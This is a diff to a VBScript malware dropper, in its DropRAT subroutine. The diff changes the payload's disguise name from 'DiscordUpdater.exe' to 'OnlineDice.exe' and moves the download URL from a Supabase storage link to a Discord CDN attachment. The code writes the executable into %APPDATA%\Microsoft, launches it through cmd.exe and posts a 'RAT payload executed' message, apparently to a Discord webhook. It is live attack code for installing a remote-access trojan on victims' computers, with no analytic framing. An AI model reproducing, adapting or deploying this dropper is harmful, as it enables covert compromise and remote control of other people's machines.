@@ -145,9 +145,10 @@ End Sub
 ' --- DropRAT ---
 Sub DropRAT()
     Dim appData: appData = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft"
-    Dim temp: temp = appData & "\DiscordUpdater.exe"
+    Dim temp: temp = appData & "\OnlineDice.exe"
     
-    Dim dl: dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
+    ' YOUR DISCORD CDN LINK
+    Dim dl: dl = "https://cdn.discordapp.com/attachments/1564152333992988672/1564333206797426779/OnlineDice.exe?ex=6ae0e254&is=6adf90d4&hm=006481d0a600e1cc0ba86313504a81212aa3e9dc45d5f307a623e8a92f21c526&"
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
 
@@ -160,7 +161,7 @@ Sub DropRAT()
         
         sh.CurrentDirectory = appData
         
-        ' THE FIX: Launch it visibly via CMD so it doesn't get silently killed
+        ' Launch visibly via cmd so it doesn't get silently killed
         sh.Run "cmd.exe /c start """" """ & temp & """", 1, False
         
         Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
